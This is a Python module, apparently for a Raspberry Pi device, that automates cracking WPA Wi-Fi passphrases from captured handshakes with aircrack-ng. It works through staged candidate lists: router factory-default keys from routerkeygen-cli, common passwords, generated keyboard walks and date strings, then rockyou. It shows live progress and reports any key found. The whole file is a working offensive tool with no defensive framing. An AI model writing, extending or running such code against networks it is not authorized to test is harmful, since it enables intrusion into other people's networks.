#!/usr/bin/env python3
"""Raton cracking engine — stage-based WPA cracking on the Pi (aircrack-ng)."""
import os
import re
import subprocess
import threading
import time

WORDLISTS = {
    "rockyou": "/usr/share/wordlists/rockyou.txt",
}

# Live state of the current/last job, read by the web UI.
etat_cassage = {
    "actif": False,
    "bssid": None,
    "reseau": None,
    "etape": None,
    "etape_num": 0,
    "etape_total": 1,
    "testes": 0,
    "total": 0,
    "vitesse": 0.0,
    "candidat": "",
    "trouve": False,
    "cle": None,
    "fini": False,
    "message": "",
    "journal": [],
}

_verrou = threading.Lock()
_proc = None

RE_TESTES = re.compile(r"(\d+)/(\d+)\s+keys tested\s+\(([\d.]+)\s*k/s\)")
RE_CANDIDAT = re.compile(r"Current passphrase:\s*(.*\S)")
RE_TROUVE = re.compile(r"KEY FOUND!\s*\[\s*(.+?)\s*\]")


def _reset(bssid, reseau):
    etat_cassage.update({
        "actif": True, "bssid": bssid, "reseau": reseau,
        "etape": None, "etape_num": 0, "etape_total": 1,
        "testes": 0, "total": 0, "vitesse": 0.0, "candidat": "",
        "trouve": False, "cle": None, "fini": False, "message": "",
        "journal": [],
    })


def lancer(pcap, bssid, reseau="", wordlist=WORDLISTS["rockyou"]):
    """Start a crack job in the background. Returns immediately."""
    _reset(bssid, reseau)
    t = threading.Thread(target=_run, args=(pcap, bssid, reseau, wordlist), daemon=True)
    t.start()

def generer_clavier(fichier):
    """Stage: keyboard walks and repetition patterns (min 8 chars for WPA)."""
    bases = [
        "1234567890", "0987654321", "azertyuiop", "qwertyuiop",
        "qsdfghjklm", "asdfghjkl", "wxcvbnm", "poiuytreza",
        "1qaz2wsx", "qazwsxedc", "1q2w3e4r5t", "zaq12wsx",
        "147258369", "123123123", "112233445566",
    ]
    motifs = set()
    for b in bases:
        if len(b) >= 8:
            motifs.add(b)
        # progressive slices of length >= 8
        for n in range(8, len(b) + 1):
            motifs.add(b[:n])
    # single-character repetitions (8 to 12 long)
    for c in "0123456789azertyuiopqsdfghjklmwxcvbn":
        for n in range(8, 13):
            motifs.add(c * n)
    with open(fichier, "w") as f:
        for m in sorted(motifs):
            f.write(m + "\n")
    return fichier

def generer_dates(fichier, an_debut=1950, an_fin=2025):
    """Stage: generate all DDMMYYYY dates (8 digits) as WPA candidates."""
    jours_par_mois = [31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    with open(fichier, "w") as f:
        for annee in range(an_debut, an_fin + 1):
            for mois in range(1, 13):
                for jour in range(1, jours_par_mois[mois - 1] + 1):
                    f.write("%02d%02d%04d\n" % (jour, mois, annee))
                    f.write("%04d%02d%02d\n" % (annee, mois, jour))
    return fichier

def cles_constructeur(essid, bssid):
    """Stage 1: ask routerkeygen-cli for factory default key candidates."""
    try:
        out = subprocess.run(
            ["routerkeygen-cli", "-q", "-s", essid, "-m", bssid],
            capture_output=True, text=True, timeout=30,
        )
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return []
    cles = []
    for ligne in out.stdout.splitlines():
        c = ligne.strip()
        if 8 <= len(c) <= 63 and " " not in c:
            cles.append(c)
    return cles

ETAGES = [
    {"nom": "factory default keys", "type": "constructeur"},
    {"nom": "common passwords", "type": "wordlist", "fichier": "/usr/share/wordlists/10k-common.txt"},
    {"nom": "keyboard patterns", "type": "genere", "generateur": generer_clavier},
    {"nom": "dates (DDMMYYYY/YYYYMMDD)", "type": "genere", "generateur": generer_dates},
    {"nom": "rockyou", "type": "wordlist", "fichier": WORDLISTS["rockyou"]},
]

def _run(pcap, bssid, reseau, wordlist):
    global _proc
    keyfile = "/tmp/raton_found.key"
    etat_cassage["etape_total"] = len(ETAGES)

    for i, etage in enumerate(ETAGES, start=1):
        if not etat_cassage["actif"]:
            break

        # Prepare this stage's wordlist
        if etage["type"] == "constructeur":
            cles = cles_constructeur(reseau, bssid)
            if not cles:
                with _verrou:
                    etat_cassage["journal"].append({"num": i, "nom": etage["nom"], "resultat": "skipped"})
                continue
            wl = "/tmp/raton_stage_const.txt"
            with open(wl, "w") as f:
                f.write("\n".join(cles) + "\n")
        elif etage["type"] == "genere":
            wl = "/tmp/raton_stage_gen.txt"
            etage["generateur"](wl)
        else:
            wl = etage["fichier"]

        with _verrou:
            etat_cassage["etape"] = etage["nom"]
            etat_cassage["etape_num"] = i
            etat_cassage["testes"] = 0
            etat_cassage["total"] = 0
            etat_cassage["candidat"] = ""

        try:
            if os.path.exists(keyfile):
                os.remove(keyfile)
        except OSError:
            pass

        cmd = ["aircrack-ng", "-w", wl, "-l", keyfile, "-b", bssid, pcap]
        try:
            _proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                universal_newlines=True, bufsize=1,
            )
        except FileNotFoundError:
            etat_cassage.update({"actif": False, "fini": True, "message": "aircrack-ng not found"})
            return

        buf = ""
        while True:
            ch = _proc.stdout.read(1)
            if ch == "":
                break
            buf += ch
            if ch in ("\r", "\n"):
                _parser(buf)
                buf = ""
        _proc.wait()

        cle = None
        try:
            with open(keyfile) as f:
                cle = f.read().strip()
        except OSError:
            pass

        if cle:
            with _verrou:
                etat_cassage["actif"] = False
                etat_cassage["fini"] = True
                etat_cassage["trouve"] = True
                etat_cassage["cle"] = cle
                etat_cassage["etape_echec"] = i
                etat_cassage["journal"].append({"num": i, "nom": etage["nom"], "resultat": "cracked"})
                etat_cassage["message"] = "Cracked"
            return

        with _verrou:
            etat_cassage["journal"].append({"num": i, "nom": etage["nom"], "resultat": "not found"})

    with _verrou:
        etat_cassage["actif"] = False
        etat_cassage["fini"] = True
        etat_cassage["message"] = "Exhausted"

def _parser(ligne):
    m = RE_TESTES.search(ligne)
    if m:
        with _verrou:
            etat_cassage["testes"] = int(m.group(1))
            etat_cassage["total"] = int(m.group(2))
            etat_cassage["vitesse"] = float(m.group(3))
    m = RE_CANDIDAT.search(ligne)
    if m:
        with _verrou:
            etat_cassage["candidat"] = m.group(1).strip()
    m = RE_TROUVE.search(ligne)
    if m:
        with _verrou:
            etat_cassage["trouve"] = True
            etat_cassage["cle"] = m.group(1)


def arreter():
    global _proc
    if _proc and _proc.poll() is None:
        _proc.terminate()
    etat_cassage["actif"] = False
    etat_cassage["fini"] = True
    etat_cassage["message"] = "Stopped"


if __name__ == "__main__":
    import sys
    pcap = sys.argv[1]
    bssid = sys.argv[2]
    wl = sys.argv[3] if len(sys.argv) > 3 else WORDLISTS["rockyou"]
    lancer(pcap, bssid, wordlist=wl)
    while not etat_cassage["fini"]:
        e = etat_cassage
        print(f"\r[{e['etape']}] {e['testes']}/{e['total']} {e['vitesse']} k/s  try={e['candidat']}   ", end="", flush=True)
        time.sleep(0.5)
    print()
    print("RESULT:", etat_cassage["message"], "KEY=", etat_cassage["cle"])
